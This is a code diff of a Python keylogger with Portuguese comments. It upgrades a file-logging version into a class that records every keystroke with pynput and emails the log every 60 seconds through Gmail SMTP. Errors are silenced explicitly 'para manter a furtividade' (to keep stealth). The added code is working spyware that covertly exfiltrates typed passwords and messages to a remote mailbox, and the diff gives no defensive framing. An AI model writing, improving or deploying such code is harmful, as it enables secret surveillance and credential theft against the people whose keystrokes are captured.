@@ -1,40 +1,64 @@
-from pynput import keyboard
+import pynput.keyboard
+import threading
 import smtplib
+import os
 
-# Arquivo para salvar os logs
-log_file = "log.txt"
+# Configurações
+EMAIL_USUARIO = "seu_email@gmail.com"
+EMAIL_SENHA = "sua_senha_de_app" # Use senhas de app para segurança
+EMAIL_DESTINO = "destino@email.com"
+INTERVALO_ENVIO = 60  # Segundos entre os envios [3]
 
-def on_press(key):
-    try:
-        # Captura teclas alfanuméricas
-        char = key.char
-    except AttributeError:
-        # Captura teclas especiais (Espaço, Enter, etc.)
-        char = f" [{key}] "
-    
-    with open(log_file, "a") as f:
-        f.write(char)
+class Keylogger:
+    def __init__(self, interval, email, password):
+        self.log = ""
+        self.interval = interval
+        self.email = email
+        self.password = password
 
-# Função para envio por e-mail (Exemplo simplificado)
-def enviar_email():
-    # Nota: Use "senhas de app" para o login do Gmail
-    usuario = "seu_email@gmail.com"
-    senha = "sua_senha_de_app" 
-    
-    with smtplib.SMTP("smtp.gmail.com", 587) as servidor:
-        servidor.starttls() # Criptografa a comunicação
-        servidor.login(usuario, senha)
-        with open(log_file, "r") as f:
-            corpo = f.read()
-        servidor.sendmail(usuario, "destino@email.com", corpo)
+    def append_to_log(self, string):
+        self.log = self.log + string
 
-# Inicia o monitoramento com tratamento de interrupção (Ctrl+C)
-try:
-    print("Keylogger em execução... Pressione Ctrl+C para parar.")
-    # Inicia o monitoramento em uma thread dedicada
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    def on_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
+
+    def enviar_email(self, assunto, corpo):
+        # Implementação de envio via SMTP
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(self.email, self.password)
+            mensagem = f"Subject: {assunto}\n\n{corpo}"
+            server.sendmail(self.email, EMAIL_DESTINO, mensagem)
+            server.quit()
+        except Exception:
+            pass # Silencia erros para manter a furtividade
+
+    def reportar(self):
+        """Função recursiva que envia os logs e agenda o próximo envio [2, 3]."""
+        if self.log:
+            self.enviar_email("Logs Capturados", self.log)
+            self.log = "" # Limpa o log após envio bem-sucedido
         
-except KeyboardInterrupt:
-    # Captura o sinal do Ctrl+C e encerra silenciosamente
-    print("\n[!] Captura interrompida pelo usuário. Encerrando o Keylogger de forma segura.")
+        # Agenda a execução da mesma função após o intervalo definido [1, 3]
+        timer = threading.Timer(self.interval, self.reportar)
+        timer.start()
+
+    def iniciar(self):
+        # Inicia o loop de reporte automático
+        self.reportar()
+        # Inicia o listener do teclado
+        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(INTERVALO_ENVIO, EMAIL_USUARIO, EMAIL_SENHA)
+    keylogger.iniciar()
+
